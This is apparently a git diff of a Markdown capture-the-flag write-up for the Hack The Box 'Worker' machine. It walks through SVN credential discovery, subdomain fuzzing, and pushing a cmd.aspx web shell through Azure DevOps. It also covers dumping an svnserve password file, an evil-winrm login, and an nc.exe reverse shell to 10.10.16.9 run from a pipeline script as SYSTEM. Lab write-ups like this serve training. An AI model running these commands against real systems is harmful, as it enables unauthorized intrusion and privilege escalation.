@@ -113,7 +113,9 @@ Updating '.':
 D    moved.txt
 A    deploy.ps1
 Updated to revision 2.
-
+```
+here A credential got
+```
 └─$ svn cat deploy.ps1  svn://10.10.10.203
 $user = "nathen" 
 $plain = "wendel98"
@@ -141,6 +143,7 @@ dimension.worker.htb devops.worker.htb
 dimension is a portal _page
 devops for dev, a login page first, enter with the credential we got
 
+use ffuf to identify subdomain, later we got all subdomain in the devops platform
 `└─$ ffuf -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u 'http://worker.htb' -H "Host:FUZZ.worker.htb" -t 100  -fw 27`
 ```
         /'___\  /'___\           /'___\       
@@ -175,11 +178,28 @@ story                   [Status: 200, Size: 16045, Words: 1068, Lines: 356, Dura
 twenty                  [Status: 200, Size: 10134, Words: 641, Lines: 275, Duration: 122ms]
 :: Progress: [653920/653920] :: Job [1/1] :: 1256 req/sec :: Duration: [0:11:59] :: Errors: 0 ::
 ```
+
 #### FootHold
 for page http://devops.worker.htb, I have credential to login
 This is devops platform MS, after some research, we can identify some subdoamins, and there is one 'spectral' is diff, with a cmd.aspx page pushed
 I create a new branch, since the master one I have no privi to build
-add the cmd.sapx page into the new branch, Then build the applicaiton by pipline
+add the cmdasd.aspx(we can find this page in the comments history by user,and it can be used) page into the new branch, Then build the applicaiton by pipline
+It can also be done in git coomand line
+```
+git clone the project
+git clone http://nathen:wendel98@devops.worker.htb/ekenas/SmartHotel360/_git/spectral
+
+new branch
+git checkout -b test
+
+cp cmd page
+git add .
+git commit -m 'xx'
+
+push it
+git push -u origin test
+__then build it using piplines
+```
 
 we can access to the cmd page on our host,
 http://spectral.worker.htb/cmdasp.aspx
@@ -215,8 +235,9 @@ dir
 2020-07-22  00:11    <DIR>          restorer
 2020-07-08  18:22    <DIR>          robisl
 ```
-
-C:\Windows\System32\inetsrv>wmic logicaldisk get deviceid, volumename, description
+OS enum, to find additiaonal drive
+`C:\Windows\System32\inetsrv>wmic logicaldisk get deviceid, volumename, description`
+```
 wmic logicaldisk get deviceid, volumename, description
 
 Description       DeviceID  VolumeName  
@@ -248,8 +269,11 @@ dir
 2020-06-20  15:04    <DIR>          svnrepos
                0 File(s)              0 bytes
                4 Dir(s)  18�766�901�248 bytes free
+```
 
-W:\>dir svnrepos\www
+#### lateral move
+`W:\>dir svnrepos\www`
+```
 dir svnrepos\www
  Volume in drive W is Work
  Volume Serial Number is E82A-AEA8
@@ -266,8 +290,10 @@ dir svnrepos\www
 2020-06-20  10:29               251 README.txt
                2 File(s)            253 bytes
                6 Dir(s)  18�766�901�248 bytes free
+```
 
-W:\svnrepos\www\conf>type passwd
+`W:\svnrepos\www\conf>type passwd`
+```
 type passwd
 ### This file is an example password file for svnserve.
 ### Its format is similar to that of svnserve.conf. As shown in the
@@ -315,14 +341,12 @@ sabken = drjones
 samken = aqua
 sapket = hamburger
 sarkil = friday
+```
 
+get  user credential : robisl = wolves11
 
-
-robisl = wolves11
-
-└─$ evil-winrm -i worker.htb -u robisl -p wolves11
-
-                                        
+`└─$ evil-winrm -i worker.htb -u robisl -p wolves11`
+```                                   
 Evil-WinRM shell v3.7
                                         
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
@@ -332,10 +356,19 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\robisl\Documents> whoami
 worker\robisl
+```
 
+#### ES
+after enum and use winpeas. nothing usefual info got.
+back to devops,use user to login
+another porject we have access, and this user is in the group of build
 
+Project Settings > Agent pools > Setup > Agents > Hamilton11 > Capabilities
+here we find this app is running by SYSTEM
 
-
+Pipelines > New Pipeline  
+here we build this project, a script field is in this process, test it with 'id'
+```
 # ASP.NET Core
 # Build and test ASP.NET Core projects targeting .NET Core.
 # Add steps that run tests, create a NuGet package, deploy, and more:
@@ -352,8 +385,10 @@ variables:
 steps:
 - script: id
   displayName: For test
+```
 
-
+start it
+```
 ##[section]Starting: For test
 ==============================================================================
 Task         : Command line
@@ -369,7 +404,9 @@ id
 ##[command]"C:\Windows\system32\cmd.exe" /D /E:ON /V:OFF /S /C "CALL "w:\agents\agent12\_work\_temp\0b267439-15a9-41d8-93ae-3c4d63e18a6b.cmd""
 uid=18(SYSTEM) gid=18 groups=18
 ##[section]Finishing: For test
-
+```
+awesome, it works, then repalce it with a nc lient, nc we have upladed before
+```
 # ASP.NET Core
 # Build and test ASP.NET Core projects targeting .NET Core.
 # Add steps that run tests, create a NuGet package, deploy, and more:
@@ -386,10 +423,10 @@ variables:
 steps:
 - script: C:\Users\robisl\Documents\nc.exe -e cmd 10.10.16.9 8822
   displayName: For test
-
-
-
-└─$ nc -nvlp 8822
+```
+set a listener on attack machine
+`└─$ nc -nvlp 8822`
+```
 listening on [any] 8822 ...
 connect to [10.10.16.9] from (UNKNOWN) [10.10.10.203] 56754
 Microsoft Windows [Version 10.0.17763.1282]
@@ -398,3 +435,9 @@ Microsoft Windows [Version 10.0.17763.1282]
 W:\agents\agent11\_work\8\s>whoami
 whoami
 nt authority\system
+```
+
+#### lesson learned
+- port 3690, for svn enum
+- devops experince
+- os enum to find driver on host
